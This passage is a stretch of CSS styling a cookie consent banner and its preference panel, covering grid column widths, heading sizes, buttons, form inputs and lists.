                box-sizing: border-box;
            }
            #onetrust-banner-sdk .ot-sdk-column,
            #onetrust-banner-sdk .ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-columns {
                width: 100%;
                float: left;
                box-sizing: border-box;
                padding: 0;
                display: initial;
            }
            @media (min-width: 400px) {
                #onetrust-banner-sdk .ot-sdk-container,
                #onetrust-pc-sdk .ot-sdk-container,
                #ot-sdk-cookie-policy .ot-sdk-container {
                    width: 90%;
                    padding: 0;
                }
            }
            @media (min-width: 550px) {
                #onetrust-banner-sdk .ot-sdk-container,
                #onetrust-pc-sdk .ot-sdk-container,
                #ot-sdk-cookie-policy .ot-sdk-container {
                    width: 100%;
                }
                #onetrust-banner-sdk .ot-sdk-column,
                #onetrust-banner-sdk .ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-column,
                #onetrust-pc-sdk .ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-column,
                #ot-sdk-cookie-policy .ot-sdk-columns {
                    margin-left: 4%;
                }
                #onetrust-banner-sdk .ot-sdk-column:first-child,
                #onetrust-banner-sdk .ot-sdk-columns:first-child,
                #onetrust-pc-sdk .ot-sdk-column:first-child,
                #onetrust-pc-sdk .ot-sdk-columns:first-child,
                #ot-sdk-cookie-policy .ot-sdk-column:first-child,
                #ot-sdk-cookie-policy .ot-sdk-columns:first-child {
                    margin-left: 0;
                }
                #onetrust-banner-sdk .ot-sdk-one.ot-sdk-column,
                #onetrust-banner-sdk .ot-sdk-one.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-one.ot-sdk-column,
                #onetrust-pc-sdk .ot-sdk-one.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-one.ot-sdk-column,
                #ot-sdk-cookie-policy .ot-sdk-one.ot-sdk-columns {
                    width: 4.66666666667%;
                }
                #onetrust-banner-sdk .ot-sdk-two.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-two.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-two.ot-sdk-columns {
                    width: 13.3333333333%;
                }
                #onetrust-banner-sdk .ot-sdk-three.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-three.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-three.ot-sdk-columns {
                    width: 22%;
                }
                #onetrust-banner-sdk .ot-sdk-four.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-four.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-four.ot-sdk-columns {
                    width: 30.6666666667%;
                }
                #onetrust-banner-sdk .ot-sdk-five.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-five.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-five.ot-sdk-columns {
                    width: 39.3333333333%;
                }
                #onetrust-banner-sdk .ot-sdk-six.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-six.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-six.ot-sdk-columns {
                    width: 48%;
                }
                #onetrust-banner-sdk .ot-sdk-seven.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-seven.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-seven.ot-sdk-columns {
                    width: 56.6666666667%;
                }
                #onetrust-banner-sdk .ot-sdk-eight.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-eight.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-eight.ot-sdk-columns {
                    width: 65.3333333333%;
                }
                #onetrust-banner-sdk .ot-sdk-nine.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-nine.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-nine.ot-sdk-columns {
                    width: 74%;
                }
                #onetrust-banner-sdk .ot-sdk-ten.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-ten.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-ten.ot-sdk-columns {
                    width: 82.6666666667%;
                }
                #onetrust-banner-sdk .ot-sdk-eleven.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-eleven.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-eleven.ot-sdk-columns {
                    width: 91.3333333333%;
                }
                #onetrust-banner-sdk .ot-sdk-twelve.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-twelve.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-twelve.ot-sdk-columns {
                    width: 100%;
                    margin-left: 0;
                }
                #onetrust-banner-sdk .ot-sdk-one-third.ot-sdk-column,
                #onetrust-pc-sdk .ot-sdk-one-third.ot-sdk-column,
                #ot-sdk-cookie-policy .ot-sdk-one-third.ot-sdk-column {
                    width: 30.6666666667%;
                }
                #onetrust-banner-sdk .ot-sdk-two-thirds.ot-sdk-column,
                #onetrust-pc-sdk .ot-sdk-two-thirds.ot-sdk-column,
                #ot-sdk-cookie-policy .ot-sdk-two-thirds.ot-sdk-column {
                    width: 65.3333333333%;
                }
                #onetrust-banner-sdk .ot-sdk-one-half.ot-sdk-column,
                #onetrust-pc-sdk .ot-sdk-one-half.ot-sdk-column,
                #ot-sdk-cookie-policy .ot-sdk-one-half.ot-sdk-column {
                    width: 48%;
                }
                #onetrust-banner-sdk .ot-sdk-offset-by-one.ot-sdk-column,
                #onetrust-banner-sdk .ot-sdk-offset-by-one.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-offset-by-one.ot-sdk-column,
                #onetrust-pc-sdk .ot-sdk-offset-by-one.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-one.ot-sdk-column,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-one.ot-sdk-columns {
                    margin-left: 8.66666666667%;
                }
                #onetrust-banner-sdk .ot-sdk-offset-by-two.ot-sdk-column,
                #onetrust-banner-sdk .ot-sdk-offset-by-two.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-offset-by-two.ot-sdk-column,
                #onetrust-pc-sdk .ot-sdk-offset-by-two.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-two.ot-sdk-column,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-two.ot-sdk-columns {
                    margin-left: 17.3333333333%;
                }
                #onetrust-banner-sdk .ot-sdk-offset-by-three.ot-sdk-column,
                #onetrust-banner-sdk .ot-sdk-offset-by-three.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-offset-by-three.ot-sdk-column,
                #onetrust-pc-sdk .ot-sdk-offset-by-three.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-three.ot-sdk-column,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-three.ot-sdk-columns {
                    margin-left: 26%;
                }
                #onetrust-banner-sdk .ot-sdk-offset-by-four.ot-sdk-column,
                #onetrust-banner-sdk .ot-sdk-offset-by-four.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-offset-by-four.ot-sdk-column,
                #onetrust-pc-sdk .ot-sdk-offset-by-four.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-four.ot-sdk-column,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-four.ot-sdk-columns {
                    margin-left: 34.6666666667%;
                }
                #onetrust-banner-sdk .ot-sdk-offset-by-five.ot-sdk-column,
                #onetrust-banner-sdk .ot-sdk-offset-by-five.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-offset-by-five.ot-sdk-column,
                #onetrust-pc-sdk .ot-sdk-offset-by-five.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-five.ot-sdk-column,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-five.ot-sdk-columns {
                    margin-left: 43.3333333333%;
                }
                #onetrust-banner-sdk .ot-sdk-offset-by-six.ot-sdk-column,
                #onetrust-banner-sdk .ot-sdk-offset-by-six.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-offset-by-six.ot-sdk-column,
                #onetrust-pc-sdk .ot-sdk-offset-by-six.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-six.ot-sdk-column,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-six.ot-sdk-columns {
                    margin-left: 52%;
                }
                #onetrust-banner-sdk .ot-sdk-offset-by-seven.ot-sdk-column,
                #onetrust-banner-sdk .ot-sdk-offset-by-seven.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-offset-by-seven.ot-sdk-column,
                #onetrust-pc-sdk .ot-sdk-offset-by-seven.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-seven.ot-sdk-column,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-seven.ot-sdk-columns {
                    margin-left: 60.6666666667%;
                }
                #onetrust-banner-sdk .ot-sdk-offset-by-eight.ot-sdk-column,
                #onetrust-banner-sdk .ot-sdk-offset-by-eight.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-offset-by-eight.ot-sdk-column,
                #onetrust-pc-sdk .ot-sdk-offset-by-eight.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-eight.ot-sdk-column,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-eight.ot-sdk-columns {
                    margin-left: 69.3333333333%;
                }
                #onetrust-banner-sdk .ot-sdk-offset-by-nine.ot-sdk-column,
                #onetrust-banner-sdk .ot-sdk-offset-by-nine.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-offset-by-nine.ot-sdk-column,
                #onetrust-pc-sdk .ot-sdk-offset-by-nine.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-nine.ot-sdk-column,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-nine.ot-sdk-columns {
                    margin-left: 78%;
                }
                #onetrust-banner-sdk .ot-sdk-offset-by-ten.ot-sdk-column,
                #onetrust-banner-sdk .ot-sdk-offset-by-ten.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-offset-by-ten.ot-sdk-column,
                #onetrust-pc-sdk .ot-sdk-offset-by-ten.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-ten.ot-sdk-column,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-ten.ot-sdk-columns {
                    margin-left: 86.6666666667%;
                }
                #onetrust-banner-sdk .ot-sdk-offset-by-eleven.ot-sdk-column,
                #onetrust-banner-sdk .ot-sdk-offset-by-eleven.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-offset-by-eleven.ot-sdk-column,
                #onetrust-pc-sdk .ot-sdk-offset-by-eleven.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-eleven.ot-sdk-column,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-eleven.ot-sdk-columns {
                    margin-left: 95.3333333333%;
                }
                #onetrust-banner-sdk .ot-sdk-offset-by-one-third.ot-sdk-column,
                #onetrust-banner-sdk .ot-sdk-offset-by-one-third.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-offset-by-one-third.ot-sdk-column,
                #onetrust-pc-sdk .ot-sdk-offset-by-one-third.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-one-third.ot-sdk-column,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-one-third.ot-sdk-columns {
                    margin-left: 34.6666666667%;
                }
                #onetrust-banner-sdk .ot-sdk-offset-by-two-thirds.ot-sdk-column,
                #onetrust-banner-sdk .ot-sdk-offset-by-two-thirds.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-offset-by-two-thirds.ot-sdk-column,
                #onetrust-pc-sdk .ot-sdk-offset-by-two-thirds.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-two-thirds.ot-sdk-column,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-two-thirds.ot-sdk-columns {
                    margin-left: 69.3333333333%;
                }
                #onetrust-banner-sdk .ot-sdk-offset-by-one-half.ot-sdk-column,
                #onetrust-banner-sdk .ot-sdk-offset-by-one-half.ot-sdk-columns,
                #onetrust-pc-sdk .ot-sdk-offset-by-one-half.ot-sdk-column,
                #onetrust-pc-sdk .ot-sdk-offset-by-one-half.ot-sdk-columns,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-one-half.ot-sdk-column,
                #ot-sdk-cookie-policy .ot-sdk-offset-by-one-half.ot-sdk-columns {
                    margin-left: 52%;
                }
            }
            #onetrust-banner-sdk h1,
            #onetrust-banner-sdk h2,
            #onetrust-banner-sdk h3,
            #onetrust-banner-sdk h4,
            #onetrust-banner-sdk h5,
            #onetrust-banner-sdk h6,
            #onetrust-pc-sdk h1,
            #onetrust-pc-sdk h2,
            #onetrust-pc-sdk h3,
            #onetrust-pc-sdk h4,
            #onetrust-pc-sdk h5,
            #onetrust-pc-sdk h6,
            #ot-sdk-cookie-policy h1,
            #ot-sdk-cookie-policy h2,
            #ot-sdk-cookie-policy h3,
            #ot-sdk-cookie-policy h4,
            #ot-sdk-cookie-policy h5,
            #ot-sdk-cookie-policy h6 {
                margin-top: 0;
                font-weight: 600;
                font-family: inherit;
            }
            #onetrust-banner-sdk h1,
            #onetrust-pc-sdk h1,
            #ot-sdk-cookie-policy h1 {
                font-size: 1.5rem;
                line-height: 1.2;
            }
            #onetrust-banner-sdk h2,
            #onetrust-pc-sdk h2,
            #ot-sdk-cookie-policy h2 {
                font-size: 1.5rem;
                line-height: 1.25;
            }
            #onetrust-banner-sdk h3,
            #onetrust-pc-sdk h3,
            #ot-sdk-cookie-policy h3 {
                font-size: 1.5rem;
                line-height: 1.3;
            }
            #onetrust-banner-sdk h4,
            #onetrust-pc-sdk h4,
            #ot-sdk-cookie-policy h4 {
                font-size: 1.5rem;
                line-height: 1.35;
            }
            #onetrust-banner-sdk h5,
            #onetrust-pc-sdk h5,
            #ot-sdk-cookie-policy h5 {
                font-size: 1.5rem;
                line-height: 1.5;
            }
            #onetrust-banner-sdk h6,
            #onetrust-pc-sdk h6,
            #ot-sdk-cookie-policy h6 {
                font-size: 1.5rem;
                line-height: 1.6;
            }
            @media (min-width: 550px) {
                #onetrust-banner-sdk h1,
                #onetrust-pc-sdk h1,
                #ot-sdk-cookie-policy h1 {
                    font-size: 1.5rem;
                }
                #onetrust-banner-sdk h2,
                #onetrust-pc-sdk h2,
                #ot-sdk-cookie-policy h2 {
                    font-size: 1.5rem;
                }
                #onetrust-banner-sdk h3,
                #onetrust-pc-sdk h3,
                #ot-sdk-cookie-policy h3 {
                    font-size: 1.5rem;
                }
                #onetrust-banner-sdk h4,
                #onetrust-pc-sdk h4,
                #ot-sdk-cookie-policy h4 {
                    font-size: 1.5rem;
                }
                #onetrust-banner-sdk h5,
                #onetrust-pc-sdk h5,
                #ot-sdk-cookie-policy h5 {
                    font-size: 1.5rem;
                }
                #onetrust-banner-sdk h6,
                #onetrust-pc-sdk h6,
                #ot-sdk-cookie-policy h6 {
                    font-size: 1.5rem;
                }
            }
            #onetrust-banner-sdk p,
            #onetrust-pc-sdk p,
            #ot-sdk-cookie-policy p {
                margin: 0 0 1em 0;
                font-family: inherit;
                line-height: normal;
            }
            #onetrust-banner-sdk a,
            #onetrust-pc-sdk a,
            #ot-sdk-cookie-policy a {
                color: #565656;
                text-decoration: underline;
            }
            #onetrust-banner-sdk a:hover,
            #onetrust-pc-sdk a:hover,
            #ot-sdk-cookie-policy a:hover {
                color: #565656;
                text-decoration: none;
            }
            #onetrust-banner-sdk .ot-sdk-button,
            #onetrust-banner-sdk button,
            #onetrust-pc-sdk .ot-sdk-button,
            #onetrust-pc-sdk button,
            #ot-sdk-cookie-policy .ot-sdk-button,
            #ot-sdk-cookie-policy button {
                margin-bottom: 1rem;
                font-family: inherit;
            }
            #onetrust-banner-sdk .ot-sdk-button,
            #onetrust-banner-sdk button,
            #onetrust-banner-sdk input[type="submit"],
            #onetrust-banner-sdk input[type="reset"],
            #onetrust-banner-sdk input[type="button"],
            #onetrust-pc-sdk .ot-sdk-button,
            #onetrust-pc-sdk button,
            #onetrust-pc-sdk input[type="submit"],
            #onetrust-pc-sdk input[type="reset"],
            #onetrust-pc-sdk input[type="button"],
            #ot-sdk-cookie-policy .ot-sdk-button,
            #ot-sdk-cookie-policy button,
            #ot-sdk-cookie-policy input[type="submit"],
            #ot-sdk-cookie-policy input[type="reset"],
            #ot-sdk-cookie-policy input[type="button"] {
                display: inline-block;
                height: 38px;
                padding: 0 30px;
                color: #555;
                text-align: center;
                font-size: 0.9em;
                font-weight: 400;
                line-height: 38px;
                letter-spacing: 0.01em;
                text-decoration: none;
                white-space: nowrap;
                background-color: transparent;
                border-radius: 2px;
                border: 1px solid #bbb;
                cursor: pointer;
                box-sizing: border-box;
            }
            #onetrust-banner-sdk .ot-sdk-button:hover,
            #onetrust-banner-sdk :not(.ot-leg-btn-container) > button:hover,
            #onetrust-banner-sdk input[type="submit"]:hover,
            #onetrust-banner-sdk input[type="reset"]:hover,
            #onetrust-banner-sdk input[type="button"]:hover,
            #onetrust-banner-sdk .ot-sdk-button:focus,
            #onetrust-banner-sdk :not(.ot-leg-btn-container) > button:focus,
            #onetrust-banner-sdk input[type="submit"]:focus,
            #onetrust-banner-sdk input[type="reset"]:focus,
            #onetrust-banner-sdk input[type="button"]:focus,
            #onetrust-pc-sdk .ot-sdk-button:hover,
            #onetrust-pc-sdk :not(.ot-leg-btn-container) > button:hover,
            #onetrust-pc-sdk input[type="submit"]:hover,
            #onetrust-pc-sdk input[type="reset"]:hover,
            #onetrust-pc-sdk input[type="button"]:hover,
            #onetrust-pc-sdk .ot-sdk-button:focus,
            #onetrust-pc-sdk :not(.ot-leg-btn-container) > button:focus,
            #onetrust-pc-sdk input[type="submit"]:focus,
            #onetrust-pc-sdk input[type="reset"]:focus,
            #onetrust-pc-sdk input[type="button"]:focus,
            #ot-sdk-cookie-policy .ot-sdk-button:hover,
            #ot-sdk-cookie-policy :not(.ot-leg-btn-container) > button:hover,
            #ot-sdk-cookie-policy input[type="submit"]:hover,
            #ot-sdk-cookie-policy input[type="reset"]:hover,
            #ot-sdk-cookie-policy input[type="button"]:hover,
            #ot-sdk-cookie-policy .ot-sdk-button:focus,
            #ot-sdk-cookie-policy :not(.ot-leg-btn-container) > button:focus,
            #ot-sdk-cookie-policy input[type="submit"]:focus,
            #ot-sdk-cookie-policy input[type="reset"]:focus,
            #ot-sdk-cookie-policy input[type="button"]:focus {
                color: #333;
                border-color: #888;
                outline: 0;
                opacity: 0.7;
            }
            #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary,
            #onetrust-banner-sdk button.ot-sdk-button-primary,
            #onetrust-banner-sdk input[type="submit"].ot-sdk-button-primary,
            #onetrust-banner-sdk input[type="reset"].ot-sdk-button-primary,
            #onetrust-banner-sdk input[type="button"].ot-sdk-button-primary,
            #onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary,
            #onetrust-pc-sdk button.ot-sdk-button-primary,
            #onetrust-pc-sdk input[type="submit"].ot-sdk-button-primary,
            #onetrust-pc-sdk input[type="reset"].ot-sdk-button-primary,
            #onetrust-pc-sdk input[type="button"].ot-sdk-button-primary,
            #ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary,
            #ot-sdk-cookie-policy button.ot-sdk-button-primary,
            #ot-sdk-cookie-policy input[type="submit"].ot-sdk-button-primary,
            #ot-sdk-cookie-policy input[type="reset"].ot-sdk-button-primary,
            #ot-sdk-cookie-policy input[type="button"].ot-sdk-button-primary {
                color: #fff;
                background-color: #33c3f0;
                border-color: #33c3f0;
            }
            #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary:hover,
            #onetrust-banner-sdk button.ot-sdk-button-primary:hover,
            #onetrust-banner-sdk input[type="submit"].ot-sdk-button-primary:hover,
            #onetrust-banner-sdk input[type="reset"].ot-sdk-button-primary:hover,
            #onetrust-banner-sdk input[type="button"].ot-sdk-button-primary:hover,
            #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary:focus,
            #onetrust-banner-sdk button.ot-sdk-button-primary:focus,
            #onetrust-banner-sdk input[type="submit"].ot-sdk-button-primary:focus,
            #onetrust-banner-sdk input[type="reset"].ot-sdk-button-primary:focus,
            #onetrust-banner-sdk input[type="button"].ot-sdk-button-primary:focus,
            #onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary:hover,
            #onetrust-pc-sdk button.ot-sdk-button-primary:hover,
            #onetrust-pc-sdk input[type="submit"].ot-sdk-button-primary:hover,
            #onetrust-pc-sdk input[type="reset"].ot-sdk-button-primary:hover,
            #onetrust-pc-sdk input[type="button"].ot-sdk-button-primary:hover,
            #onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary:focus,
            #onetrust-pc-sdk button.ot-sdk-button-primary:focus,
            #onetrust-pc-sdk input[type="submit"].ot-sdk-button-primary:focus,
            #onetrust-pc-sdk input[type="reset"].ot-sdk-button-primary:focus,
            #onetrust-pc-sdk input[type="button"].ot-sdk-button-primary:focus,
            #ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary:hover,
            #ot-sdk-cookie-policy button.ot-sdk-button-primary:hover,
            #ot-sdk-cookie-policy input[type="submit"].ot-sdk-button-primary:hover,
            #ot-sdk-cookie-policy input[type="reset"].ot-sdk-button-primary:hover,
            #ot-sdk-cookie-policy input[type="button"].ot-sdk-button-primary:hover,
            #ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary:focus,
            #ot-sdk-cookie-policy button.ot-sdk-button-primary:focus,
            #ot-sdk-cookie-policy input[type="submit"].ot-sdk-button-primary:focus,
            #ot-sdk-cookie-policy input[type="reset"].ot-sdk-button-primary:focus,
            #ot-sdk-cookie-policy input[type="button"].ot-sdk-button-primary:focus {
                color: #fff;
                background-color: #1eaedb;
                border-color: #1eaedb;
            }
            #onetrust-banner-sdk input[type="email"],
            #onetrust-banner-sdk input[type="number"],
            #onetrust-banner-sdk input[type="search"],
            #onetrust-banner-sdk input[type="text"],
            #onetrust-banner-sdk input[type="tel"],
            #onetrust-banner-sdk input[type="url"],
            #onetrust-banner-sdk input[type="password"],
            #onetrust-banner-sdk textarea,
            #onetrust-banner-sdk select,
            #onetrust-pc-sdk input[type="email"],
            #onetrust-pc-sdk input[type="number"],
            #onetrust-pc-sdk input[type="search"],
            #onetrust-pc-sdk input[type="text"],
            #onetrust-pc-sdk input[type="tel"],
            #onetrust-pc-sdk input[type="url"],
            #onetrust-pc-sdk input[type="password"],
            #onetrust-pc-sdk textarea,
            #onetrust-pc-sdk select,
            #ot-sdk-cookie-policy input[type="email"],
            #ot-sdk-cookie-policy input[type="number"],
            #ot-sdk-cookie-policy input[type="search"],
            #ot-sdk-cookie-policy input[type="text"],
            #ot-sdk-cookie-policy input[type="tel"],
            #ot-sdk-cookie-policy input[type="url"],
            #ot-sdk-cookie-policy input[type="password"],
            #ot-sdk-cookie-policy textarea,
            #ot-sdk-cookie-policy select {
                height: 38px;
                padding: 6px 10px;
                background-color: #fff;
                border: 1px solid #d1d1d1;
                border-radius: 4px;
                box-shadow: none;
                box-sizing: border-box;
            }
            #onetrust-banner-sdk input[type="email"],
            #onetrust-banner-sdk input[type="number"],
            #onetrust-banner-sdk input[type="search"],
            #onetrust-banner-sdk input[type="text"],
            #onetrust-banner-sdk input[type="tel"],
            #onetrust-banner-sdk input[type="url"],
            #onetrust-banner-sdk input[type="password"],
            #onetrust-banner-sdk textarea,
            #onetrust-pc-sdk input[type="email"],
            #onetrust-pc-sdk input[type="number"],
            #onetrust-pc-sdk input[type="search"],
            #onetrust-pc-sdk input[type="text"],
            #onetrust-pc-sdk input[type="tel"],
            #onetrust-pc-sdk input[type="url"],
            #onetrust-pc-sdk input[type="password"],
            #onetrust-pc-sdk textarea,
            #ot-sdk-cookie-policy input[type="email"],
            #ot-sdk-cookie-policy input[type="number"],
            #ot-sdk-cookie-policy input[type="search"],
            #ot-sdk-cookie-policy input[type="text"],
            #ot-sdk-cookie-policy input[type="tel"],
            #ot-sdk-cookie-policy input[type="url"],
            #ot-sdk-cookie-policy input[type="password"],
            #ot-sdk-cookie-policy textarea {
                -webkit-appearance: none;
                -moz-appearance: none;
                appearance: none;
            }
            #onetrust-banner-sdk textarea,
            #onetrust-pc-sdk textarea,
            #ot-sdk-cookie-policy textarea {
                min-height: 65px;
                padding-top: 6px;
                padding-bottom: 6px;
            }
            #onetrust-banner-sdk input[type="email"]:focus,
            #onetrust-banner-sdk input[type="number"]:focus,
            #onetrust-banner-sdk input[type="search"]:focus,
            #onetrust-banner-sdk input[type="text"]:focus,
            #onetrust-banner-sdk input[type="tel"]:focus,
            #onetrust-banner-sdk input[type="url"]:focus,
            #onetrust-banner-sdk input[type="password"]:focus,
            #onetrust-banner-sdk textarea:focus,
            #onetrust-banner-sdk select:focus,
            #onetrust-pc-sdk input[type="email"]:focus,
            #onetrust-pc-sdk input[type="number"]:focus,
            #onetrust-pc-sdk input[type="search"]:focus,
            #onetrust-pc-sdk input[type="text"]:focus,
            #onetrust-pc-sdk input[type="tel"]:focus,
            #onetrust-pc-sdk input[type="url"]:focus,
            #onetrust-pc-sdk input[type="password"]:focus,
            #onetrust-pc-sdk textarea:focus,
            #onetrust-pc-sdk select:focus,
            #ot-sdk-cookie-policy input[type="email"]:focus,
            #ot-sdk-cookie-policy input[type="number"]:focus,
            #ot-sdk-cookie-policy input[type="search"]:focus,
            #ot-sdk-cookie-policy input[type="text"]:focus,
            #ot-sdk-cookie-policy input[type="tel"]:focus,
            #ot-sdk-cookie-policy input[type="url"]:focus,
            #ot-sdk-cookie-policy input[type="password"]:focus,
            #ot-sdk-cookie-policy textarea:focus,
            #ot-sdk-cookie-policy select:focus {
                border: 1px solid #33c3f0;
                outline: 0;
            }
            #onetrust-banner-sdk label,
            #onetrust-banner-sdk legend,
            #onetrust-pc-sdk label,
            #onetrust-pc-sdk legend,
            #ot-sdk-cookie-policy label,
            #ot-sdk-cookie-policy legend {
                display: block;
                margin-bottom: 0.5rem;
                font-weight: 600;
            }
            #onetrust-banner-sdk fieldset,
            #onetrust-pc-sdk fieldset,
            #ot-sdk-cookie-policy fieldset {
                padding: 0;
                border-width: 0;
            }
            #onetrust-banner-sdk input[type="checkbox"],
            #onetrust-banner-sdk input[type="radio"],
            #onetrust-pc-sdk input[type="checkbox"],
            #onetrust-pc-sdk input[type="radio"],
            #ot-sdk-cookie-policy input[type="checkbox"],
            #ot-sdk-cookie-policy input[type="radio"] {
                display: inline;
            }
            #onetrust-banner-sdk label > .label-body,
            #onetrust-pc-sdk label > .label-body,
            #ot-sdk-cookie-policy label > .label-body {
                display: inline-block;
                margin-left: 0.5rem;
                font-weight: normal;
            }
            #onetrust-banner-sdk ul,
            #onetrust-pc-sdk ul,
            #ot-sdk-cookie-policy ul {
                list-style: circle inside;
            }
            #onetrust-banner-sdk ol,
            #onetrust-pc-sdk ol,
            #ot-sdk-cookie-policy ol {
                list-style: decimal inside;
            }
            #onetrust-banner-sdk ol,
            #onetrust-banner-sdk ul,
            #onetrust-pc-sdk ol,
            #onetrust-pc-sdk ul,
            #ot-sdk-cookie-policy ol,
            #ot-sdk-cookie-policy ul {
                padding-left: 0;
                margin-top: 0;
            }
            #onetrust-banner-sdk ul ul,
            #onetrust-banner-sdk ul ol,
            #onetrust-banner-sdk ol ol,
            #onetrust-banner-sdk ol ul,
            #onetrust-pc-sdk ul ul,
            #onetrust-pc-sdk ul ol,
            #onetrust-pc-sdk ol ol,
            #onetrust-pc-sdk ol ul,
            #ot-sdk-cookie-policy ul ul,
            #ot-sdk-cookie-policy ul ol,
            #ot-sdk-cookie-policy ol ol,
            #ot-sdk-cookie-policy ol ul {
                margin: 1.5rem 0 1.5rem 3rem;
                font-size: 90%;
            }
            #onetrust-banner-sdk li,
            #onetrust-pc-sdk li,
            #ot-sdk-cookie-policy li {
                margin-bottom: 1rem;
            }
            #onetrust-banner-sdk code,
            #onetrust-pc-sdk code,
            #ot-sdk-cookie-policy code {
                padding: 0.2rem 0.5rem;
                margin: 0 0.2rem;
                font-size: 90%;
                white-space: nowrap;
                background: #f1f1f1;
                border: 1px solid #e1e1e1;
                border-radius: 4px;
            }
            #onetrust-banner-sdk pre > code,
            #onetrust-pc-sdk pre > code,
            #ot-sdk-cookie-policy pre > code {
                display: block;
                padding: 1rem 1.5rem;
                white-space: pre;
            }
            #onetrust-banner-sdk th,
            #onetrust-banner-sdk td,
            #onetrust-pc-sdk th,
            #onetrust-pc-sdk td,
            #ot-sdk-cookie-policy th,
            #ot-sdk-cookie-policy td {
                padding: 12px 15px;
                text-align: left;
                border-bottom: 1px solid #e1e1e1;
            }
            #onetrust-banner-sdk .ot-sdk-u-full-width,
            #onetrust-pc-sdk .ot-sdk-u-full-width,
            #ot-sdk-cookie-policy .ot-sdk-u-full-width {
                width: 100%;
                box-sizing: border-box;
            }
            #onetrust-banner-sdk .ot-sdk-u-max-full-width,
            #onetrust-pc-sdk .ot-sdk-u-max-full-width,
            #ot-sdk-cookie-policy .ot-sdk-u-max-full-width {
                max-width: 100%;
                box-sizing: border-box;
            }
            #onetrust-banner-sdk .ot-sdk-u-pull-right,
            #onetrust-pc-sdk .ot-sdk-u-pull-right,
            #ot-sdk-cookie-policy .ot-sdk-u-pull-right {
                float: right;
            }
            #onetrust-banner-sdk .ot-sdk-u-pull-left,
            #onetrust-pc-sdk .ot-sdk-u-pull-left,
            #ot-sdk-cookie-policy .ot-sdk-u-pull-left {
                float: left;
            }
            #onetrust-banner-sdk hr,
            #onetrust-pc-sdk hr,
